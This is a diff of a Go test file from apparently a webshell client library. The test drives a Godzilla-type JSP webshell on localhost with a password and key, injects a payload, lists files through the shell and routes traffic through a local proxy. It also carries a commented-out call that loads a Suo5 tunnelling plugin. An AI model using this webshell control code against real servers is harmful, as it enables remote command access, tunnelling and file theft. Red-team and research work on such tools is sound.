@@ -93,8 +93,15 @@ function encrypt($data){
 }
 
 func TestInjectSuo5Servlet(t *testing.T) {
-	url := "http://127.0.0.1:8080/tomcatLearn_war_exploded/shell.jsp"
-	godzillaShell, _ := NewWebShell(url, SetGodzillaTool(), SetPass("pass"), SetSecretKey("key"), SetShellScript("jsp"), SetBase64Aes())
+	url := "http://127.0.0.1:8080/bs64.jsp"
+	godzillaShell, _ := NewWebShell(
+		url,
+		SetGodzillaTool(),
+		SetPass("pass"), SetSecretKey("key"),
+		SetShellScript("jsp"),
+		SetBase64Aes(),
+		SetProxy("http://127.0.0.1:9999"),
+	)
 	g := godzillaShell.(*Godzilla)
 	err := g.InjectPayload()
 	if err != nil {
@@ -105,12 +112,14 @@ func TestInjectSuo5Servlet(t *testing.T) {
 		panic(err)
 	}
 	fmt.Println(ping)
-	plugin, err := g.LoadSuo5Plugin("go0p", "servlet", "/suo5")
+	list, err := g.getFile("C:/phpstudy_prox")
+	//plugin, err := g.LoadSuo5Plugin("go0p", "servlet", "/suo5")
 	if err != nil {
 		panic(err)
 	}
+	//
+	fmt.Println(string(list))
 
-	spew.Dump(plugin)
 }
 
 func TestInjectSuo5Filter(t *testing.T) {
